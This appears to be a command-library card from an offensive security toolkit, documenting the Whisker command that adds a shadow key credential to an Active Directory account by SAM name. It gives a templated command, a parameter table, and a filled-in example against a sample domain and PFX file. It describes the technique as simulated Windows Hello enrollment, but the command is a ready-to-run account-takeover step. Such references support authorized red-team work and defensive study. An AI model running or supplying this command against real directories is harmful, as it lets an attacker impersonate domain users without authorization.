---
id: f37bdc20-504e-4e26-9caf-d8bfe583837a
name: whisker-add-key-credential-samname
type: command
executor: cmd
data: >-
  Whisker.exe add /target:"$_TARGET_SAMNAME" /domain:"$_FQDN_DOMAIN"
  /dc:"$_DOMAIN_CONTROLLER" /path:"$_PFX_PATH" /password:"$_PFX_PASSWORD"
output: null
created_at: '2023-04-06T03:56:06.261395+00:00'
updated_at: '2023-04-10T20:26:09.591812+00:00'
platforms:
  - Windows
tags:
  - active-directory
  - key-credentials
verified: true
validated: true
---

# whisker-add-key-credential-samname

## Command

```cmd
Whisker.exe add /target:"$_TARGET_SAMNAME" /domain:"$_FQDN_DOMAIN" /dc:"$_DOMAIN_CONTROLLER" /path:"$_PFX_PATH" /password:"$_PFX_PASSWORD"
```

## Description

Adds a new key credential to a target using its SAM name, simulating Windows Hello enrollment. Requires a PFX file with the public-private key pair.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /target:$_TARGET_SAMNAME | Target SAM account name (e.g., "user1") | Yes |
| /domain:$_FQDN_DOMAIN | Fully qualified domain name (e.g., contoso.local) | Yes |
| /dc:$_DOMAIN_CONTROLLER | Domain controller FQDN (e.g., dc1.contoso.local) | Yes |
| /path:$_PFX_PATH | Path to PFX certificate file | Yes |
| /password:$_PFX_PASSWORD | Password for the PFX file | Yes |

## Examples

### Basic Usage

```cmd
Whisker.exe add /target:"targetuser" /domain:"contoso.local" /dc:"dc1.contoso.local" /path:"C:\cert.pfx" /password:"P@ssw0rd"
```

## Expected Output

"Key credential added successfully" or similar confirmation. No output on failure; check event logs.

## Related

- [[procedures/Shadow-Credentials-for-Windows-Hello]]
- [[tools/Whisker]]
